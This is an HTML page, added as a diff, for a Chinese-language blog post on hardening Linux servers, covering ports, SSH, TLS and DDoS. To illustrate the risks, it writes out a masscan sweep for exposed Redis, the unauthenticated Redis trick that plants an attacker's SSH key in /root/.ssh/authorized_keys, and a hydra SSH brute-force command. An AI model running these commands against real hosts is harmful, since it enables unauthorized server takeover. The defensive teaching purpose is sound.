@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Rookie" />
+
+
+
+<meta name="description" content="Web Security 至关重要，本文将介绍适合防范黑客攻击，保证服务器的安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Secure The Server">
+<meta property="og:url" content="https://www.rookie-home.xyz/2020/01/03/Secure-The-Server/index.html">
+<meta property="og:site_name" content="Here | Rookie">
+<meta property="og:description" content="Web Security 至关重要，本文将介绍适合防范黑客攻击，保证服务器的安全">
+<meta property="article:published_time" content="2020-01-03T00:56:02.000Z">
+<meta property="article:modified_time" content="2020-04-16T17:03:27.960Z">
+<meta property="article:author" content="Rookie">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Here | Rookie" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/avatar.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Secure The Server | Here | Rookie</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Rookie</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Less Interests, More Interest.</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">文章分类</a></li>
+                        
+                            <li><a href="/miniapp/">More Interest</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:rookieszh@gmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/rookieszh/" target="_blank" rel="noopener" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2PC/" rel="tag">2PC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/3PC/" rel="tag">3PC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/API/" rel="tag">API</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BigData/" rel="tag">BigData</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Browser/" rel="tag">Browser</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cookie/" rel="tag">Cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DDOS/" rel="tag">DDOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DataBase-Design/" rel="tag">DataBase Design</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Deep-Learning/" rel="tag">Deep Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Function/" rel="tag">Function</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JWT/" rel="tag">JWT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MessageQueue/" rel="tag">MessageQueue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Multimodal/" rel="tag">Multimodal</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/" rel="tag">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NoSQL/" rel="tag">NoSQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSI/" rel="tag">OSI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Optimization/" rel="tag">Optimization</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RabbitMQ/" rel="tag">RabbitMQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Refactor-Code/" rel="tag">Refactor Code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Regex/" rel="tag">Regex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Statistics/" rel="tag">Statistics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TCP/" rel="tag">TCP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Unicode/" rel="tag">Unicode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/index/" rel="tag">index</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/transaction/" rel="tag">transaction</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Rookie</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Rookie</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Less Interests, More Interest.</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">文章分类</a></li>
+                
+                    <li><a href="/miniapp/">More Interest</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:rookieszh@gmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/rookieszh/" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Secure-The-Server" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/01/03/Secure-The-Server/" class="article-date">
+      <time datetime="2020-01-03T00:56:02.000Z" itemprop="datePublished">2020-01-03</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Secure The Server
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Internet/">Internet</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/" rel="tag">Security</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="修改远程连接端口"><a href="#修改远程连接端口" class="headerlink" title="修改远程连接端口"></a>修改远程连接端口</h2><p>例如 windows 的 3389，Linux 的 22 端口。应用服务尽量不要对公网开放，尤其是中间件服务，除了 web 服务所提供的 80，443 端口之外都应该尽量不要对公网开放默认端口，例如 MySQL 的 3306 ，Redis 的 6379 等等。</p>
+<p>因为互联网上大量的入侵都是首先扫描到开放这些默认端口的机器，然后在探测是否存在已知的漏洞进而发起攻击。</p>
+<p>举个例子，假如入侵者想入侵 redis 3.0 以下版本的 redis，攻击者可以通过 nmap 或 masscan 这类扫描攻击扫描某一个 IP 段是否开放以及根据你的服务器特征探测你的服务器是 Linux 还是 Windows来选择以何种方式发起攻击，以 masscan 为例，探测49.111.0.0/16网段内是否有 redis 服务开启默认 6379 端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p6379 49.111.0.0&#x2F;16 --rate 10000 &gt;&gt; scan.txt</span><br></pre></td></tr></table></figure>
+<p>然后获取到该网段开放了 6379 端口的 IP，并进行下一步判断其是否有设置密码，版本是否是 3.0 以下。执行如下命令即可查看这台 redis 的相关信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-cli -h IP info</span><br></pre></td></tr></table></figure>
+<p>然后判断是否设置了密码,如果没有设置密码，通过 redis 的持久化机制将入侵者的公钥写入到/.ssh 目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">&gt; set xxx &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWuati70x2tsLBJ6FxDgK5NnRhUiIYMHEL9Nt0cwtOvlc8it7Ta9uSzQX6RV3hpF0Txg8&#x2F;ARZaq75JyzN+1jsNh35mR49YWJloU8FbiI28IjdKAVvCOcAd&#x2F;WWsPWrRIJPG38Z8Bu2xXBsNCmMwOtPd6VL4k9j6xmeA52PLe4wBJHZbGkPrbTxd7TTtvuWWmbx0dzvXBYCIalhVOJ7u5471tMBoCFGCYh5V8lzS0c4Hm3tf5SuQ8G3vWP8fLE6iUGen9rqBu+QNSxlYJSwz+O5T&#x2F;ErFTFPZI3USQM7th1r6iY&#x2F;Z8O7AzZlhXzPCHKcd&#x2F;+8mzcEJ1JFU8m9gXgF6JwER ubuntu@ubuntu-xenial\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>
+
+<h2 id="遭受攻击后采取措施"><a href="#遭受攻击后采取措施" class="headerlink" title="遭受攻击后采取措施"></a>遭受攻击后采取措施</h2><p>养成定期更新你的系统和应用软件，因为旧版本软件大多都会存在漏洞被攻击者利用。<br>尽量不要以管理员权限运行一些应用程序，要以一个普通用户运行指定程序，防止被提权。<br>禁止密码登录，改为更安全的密钥登录。密钥采用rsa非对称加密算法，并设置大于 2048 位以上密钥，安全系数更高。因为如果采用密码登录，入侵者只要密码字典足够强大，机器运算能力够强是可以非常轻松的破解的，例如通过 hydra 来暴力破解密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -s 22 -v -l root -P pass.txt 49.111.95.153 ssh</span><br></pre></td></tr></table></figure>
+<p>以 Linux 为例，修改/etc/ssh/sshd_config 中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 不允许任何人作为根用户登录</span><br><span class="line">PermitRootLogin yes 为 no</span><br><span class="line"># 允许一次登录花费 30 秒；如果超过 30 秒，就不允许访问，必须重新登录。</span><br><span class="line">LoginGraceTime 30</span><br><span class="line"></span><br><span class="line">PasswordAuthentication yes 为 no</span><br><span class="line"># 限制最大重试次数为 3 次，3 次之后拒绝登录尝试。</span><br><span class="line">MaxAuthTries 3</span><br><span class="line"># 禁止使用比较弱的协议。</span><br><span class="line">Protocol 2</span><br></pre></td></tr></table></figure>
+
+<h2 id="最小化对外暴露端口"><a href="#最小化对外暴露端口" class="headerlink" title="最小化对外暴露端口"></a>最小化对外暴露端口</h2><p>除非有必要，千万不要将所有端口都设置端口放行为 0.0.0.0/0 这样的规则。<br>除了 80、443 这样的必须要对外开放访问权限的端口，其他服务都在相对安全的内网环境中运行，这样的优势是除了提升了安全性还防止跨链路带来的带宽损耗，提升访问速度。例如web 服务调用后端 MySQL，如果通过公网访问，速度肯定不及同一个局域网内互相访问的快。</p>
+<h2 id="在使用-HTTPS-时尽量使用-TLS1-2-版本的协议，并使用加密性非常好的算法。"><a href="#在使用-HTTPS-时尽量使用-TLS1-2-版本的协议，并使用加密性非常好的算法。" class="headerlink" title="在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。"></a>在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!KRB5:!aECDH:!EDH+3DES;</span><br></pre></td></tr></table></figure>
+
+<h2 id="如果遭受-DDOS-攻击，可以考虑购买一些防护服务来解决，避免业务受损。"><a href="#如果遭受-DDOS-攻击，可以考虑购买一些防护服务来解决，避免业务受损。" class="headerlink" title="如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。"></a>如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。</h2><p>常见的有 <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">cloudflare</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/01/03/Secure-The-Server/">Secure The Server</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Rookie</a></p>
+        <p><span>发布时间:</span>2020-01-03, 08:56:02</p>
+        <p><span>最后更新:</span>2020-04-17, 01:03:27</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/01/03/Secure-The-Server/" title="Secure The Server">https://www.rookie-home.xyz/2020/01/03/Secure-The-Server/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://www.rookie-home.xyz/2020/01/03/Secure-The-Server/　　作者: Rookie" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/01/04/DDOS/">
+                    DDOS
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/12/03/Docker-Tools/">
+                    Docker Tools
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#修改远程连接端口"><span class="toc-number">1.</span> <span class="toc-text">修改远程连接端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#遭受攻击后采取措施"><span class="toc-number">2.</span> <span class="toc-text">遭受攻击后采取措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最小化对外暴露端口"><span class="toc-number">3.</span> <span class="toc-text">最小化对外暴露端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在使用-HTTPS-时尽量使用-TLS1-2-版本的协议，并使用加密性非常好的算法。"><span class="toc-number">4.</span> <span class="toc-text">在使用 HTTPS 时尽量使用 TLS1.2+版本的协议，并使用加密性非常好的算法。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果遭受-DDOS-攻击，可以考虑购买一些防护服务来解决，避免业务受损。"><span class="toc-number">5.</span> <span class="toc-text">如果遭受 DDOS 攻击，可以考虑购买一些防护服务来解决，避免业务受损。</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Secure The Server　| Here | Rookie　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://www.rookie-home.xyz/2020/01/03/Secure-The-Server/';
+            this.page.identifier = '2020/01/03/Secure-The-Server/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//www-rookie-home-xyz.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/01/04/DDOS/" title="上一篇: DDOS">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/12/03/Docker-Tools/" title="下一篇: Docker Tools">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/What-is-Code-Refactoring-and-How-To-Refactor/">What is Code Refactoring and How To Refactor</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/09/Use-Regex-in-Python/">Use Regex in Python</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/01/Design-A-Secure-API/">Design A Secure API</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/17/Function-And-Mapping/">Function And Mapping</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/13/Regex/">Regex</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/06/Monte-Carlo-Programming/">Monte Carlo Programming</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/04/DDOS/">DDOS</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/Secure-The-Server/">Secure The Server</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/03/Docker-Tools/">Docker Tools</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/11/Message-Queue-%E2%80%94%E2%80%94RabbitMQ/">Message Queue ——RabbitMQ</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/03/2PC-And-3PC/">2PC And 3PC</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/29/Nginx-Error/">Nginx Error</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/Nginx-Optimization/">Nginx Optimization</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Nginx-Syntax/">Nginx Syntax</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/05/What-Can-Nginx-Do-and-How-to-Use-Nginx/">What Can Nginx Do and How to Use Nginx</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/Introduction-of-Nginx/">Introduction of Nginx</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/16/DockerCompose-yml/">DockerCompose.yml</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/How-To-Use-Docker-Compose/">How To Use Docker Compose</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/Docker-Compose-Introduction/">Docker Compose Introduction</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/12/Manage-Docker-Container/">Manage Docker Container</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/DockerFile/">DockerFile</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/11/How-To-Use-Docker/">How To Use Docker</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/10/Docker-Introduction/">Docker Introduction</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/07/Json-Web-Token/">Json Web Token</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/05/Cookie/">Cookie</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/03/How-The-Browser-Works/">How The Browser Works</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/01/Unicode-Introduction/">Unicode Introduction</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/TCP/">TCP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/Open-System-Interconnection-Introduction/">Open System Interconnection Introduction</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/Avoid-Accident-of-Redis/">Avoid Accident of Redis</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/Redis-Persistence/">Redis Persistence</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/Redis-RAM/">Redis RAM</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/13/Redis-Transcation/">Redis Transcation</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/Redis-Data-Structure/">Redis Data Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/Redis-Operation/">Redis Operation</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/Redis-Introduction/">Redis Introduction</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/NoSQL/">NoSQL</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/Database-Design/">Database Design</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/Mysql-Optimization/">Mysql Optimization</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/Additional-SQL/">Additional SQL</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/Transaction-ACID/">Transaction ACID</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/SQL/">SQL</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/02/Mysql/">Mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/05/ReadingNote%E2%80%94%E2%80%94MMML/">ReadingNote——MMML</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 Rookie
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
